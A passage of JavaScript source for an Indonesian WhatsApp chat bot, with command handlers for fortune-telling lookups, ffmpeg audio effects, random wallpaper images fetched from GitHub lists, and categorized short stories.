          let anu = await primbon.ramalan_jodoh_bali(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "suamiistri":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q)
            return reply(
              `Example :\n${
                prefix + command
              } Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`
            );
          let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`;
          let anu = await primbon.suami_istri(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return m.reply(anu.message);
          reply(
            `> *Nama Suami :* ${anu.message.suami.nama}\n> *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n> *Nama Istri :* ${anu.message.istri.nama}\n> *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "ramalancinta":
      case "ramalcinta":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q)
            return reply(
              `Example :\n${
                prefix + command
              } Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`
            );
          let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`;
          let anu = await primbon.ramalan_cinta(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}\n> *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "artinama":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q) return reply(`Example :\n${prefix + command} Yanto`);
          let anu = await primbon.arti_nama(text);
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nama :* ${q}\n> *Arti :* ${anu.message.arti}\n> *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "kecocokannama":
      case "cocoknama":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q)
            return reply(`Example :\n${prefix + command} yanto, 7, 7, 2005`);
          let [nama, tgl, bln, thn] = q.split`,`;
          let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nama :* ${anu.message.nama}\n> *Lahir :* ${anu.message.tgl_lahir}\n> *Life Path :* ${anu.message.life_path}\n> *Destiny :* ${anu.message.destiny}\n> *Destiny Desire :* ${anu.message.destiny_desire}\n> *Personality :* ${anu.message.personality}\n> *Persentase :* ${anu.message.persentase_kecocokan}`
          );
        }
        break;
      case "kecocokanpasangan":
      case "cocokpasangan":
      case "pasangan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q) return reply(`Example :\n${prefix + command} yanto|yanti`);
          let [nama1, nama2] = q.split`|`;
          let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2);
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nama Anda :* ${anu.message.nama_anda}\n> *Nama Pasangan :* ${anu.message.nama_pasangan}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}`
          );
        }
        break;
      case "sifatusaha":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q) return reply(`Example : ${prefix + command} 24, 10, 2005`);
          let [tgl, bln, thn] = q.split`,`;
          let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn);
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Lahir :* ${anu.message.hari_lahir}\n> *Usaha :* ${anu.message.usaha}`
          );
        }
        break;
      case "halah":
      case "hilih":
      case "huluh":
      case "heleh":
      case "holoh":
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
        if (!quoted && !q)
          reply(`Kirim/reply text dengan caption *${prefix + command}*`);
        var ter = command[0].toLowerCase();
        var tex = quoted
          ? quoted.text
            ? quoted.text
            : q
            ? q
            : text
          : q
          ? q
          : text;
        reply(
          tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase())
        );
        break;

      // AUDIO CHANGER
      case "bass":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = "-af equalizer=f=54:width_type=o:width=2:g=20";
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "blown":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = "-af acrusher=.1:1:64:0:log";
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "deep":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = "-af atempo=4/4,asetrate=44500*2/3";
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "earrape":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = "-af volume=12";
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "fast":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = '-filter:a "atempo=1.63,asetrate=44100"';
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "fat":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = '-filter:a "atempo=1.6,asetrate=22100"';
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "nightcore":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = '-filter_complex "areverse';
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "reverse":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = '-filter_complex "areverse"';
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "robot":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js =
              "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "slow":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = '-filter:a "atempo=0.7,asetrate=44100"';
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "smooth":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js =
              "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "tupai":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (isQuotedAudio) {
            var buffer = await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${command}.mp3`
            );
            let ran = "sticker/" + getRandom(".mp3");
            var kode_js = '-filter:a "atempo=0.5,asetrate=65100"';
            exec(
              `ffmpeg -i ${buffer} ${kode_js} ${ran}`,
              (err, stderr, stdout) => {
                if (err) return reply(err);
                reply(mess.wait);
                let buff = fs.readFileSync(ran);
                conn.sendMessage(
                  from,
                  { audio: buff, mimetype: "audio/mpeg" },
                  { quoted: msg }
                );
                fs.unlinkSync(`./${ran}`);
                fs.unlinkSync(`./${buffer}`);
              }
            );
          } else {
            reply(`Balas audio yang ingin diubah dengan caption *#${command}*`);
          }
        }
        break;

      case "wallpaperislami":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let kcle = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Islamic.json`
          );
          let random = kcle[Math.floor(Math.random() * kcle.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpaperinori":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let kuxe = await fetchJson(
            `https://raw.githubusercontent.com/qisyana/senku/main/storages/inori-pic.json`
          );
          let random = kuxe[Math.floor(Math.random() * kuxe.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpapercyber":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let xpwl = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/CyberSpace.json`
          );
          let random = xpwl[Math.floor(Math.random() * xpwl.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;

      // Random image
      case "waifu":
      case "loli":
      case "husbu":
      case "milf":
      case "cosplay":
      case "wallml":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let eek = await fetchJson(
            `https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`
          );
          let random = eek[Math.floor(Math.random() * eek.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpaperteknologi":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let toth = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Technology.json`
          );
          let random = toth[Math.floor(Math.random() * toth.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpaperanime":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let tozs = await fetchJson(
            `https://raw.githubusercontent.com/qisyana/senku/main/storages/anime-wallpaper-pic.json`
          );
          let random = tozs[Math.floor(Math.random() * tozs.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpapergamer":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let toew = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/GameWallp.json`
          );
          let random = toew[Math.floor(Math.random() * toew.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpaperprogamer":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let xeke = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Programming.json`
          );
          let random = xeke[Math.floor(Math.random() * xeke.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpapermeme":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let crkr = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/meme.json`
          );
          let random = crkr[Math.floor(Math.random() * crkr.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "wallpaper":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let crpe = await fetchJson(
            `https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Mountain.json`
          );
          let random = crpe[Math.floor(Math.random() * crpe.length)];
          conn.sendMessage(
            from,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: msg }
          );
        }
        break;
      case "ppcouple":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let anu = await fetchJson(
            "https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json"
          );
          let random = anu[Math.floor(Math.random() * anu.length)];
          conn.sendMessage(
            from,
            { image: { url: random.male }, caption: `Foto Couple Male` },
            { quoted: msg }
          );
          conn.sendMessage(
            from,
            { image: { url: random.female }, caption: `Fofo Couple Female` },
            { quoted: msg }
          );
        }
        break;

      case "cerpen-anak":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`anak`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-bahasadaerah":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`bahasa daerah`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-bahasainggris":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`bahasa Inggris`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-bahasajawa":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`bahasa jawa`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-bahasasunda":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`bahasa sunda`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-budaya":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`budaya`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cinta":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`cinta`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cintaislami":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`cinta islami`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cintapertama":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`cinta pertama`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cintaromantis":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`cinta romantis`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cintasedih":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`cinta sedih`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cintasegitiga":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`Cinta segitiga`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-cintasejati":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`cinta sejati`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-galau":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`galau`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-gokil":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`gokil`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-inspiratif":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`inspiratif`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-jepang":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`jepang`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-kehidupan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`kehidupan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-keluarga":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`keluarga`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-kisahnyata":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`kisah nyata`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-korea":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`korea`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-kristen":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`kristen`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-liburan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`liburan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-malaysia":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`malaysia`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-mengharukan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`mengharukan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-misteri":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`misteri`);
          reply(
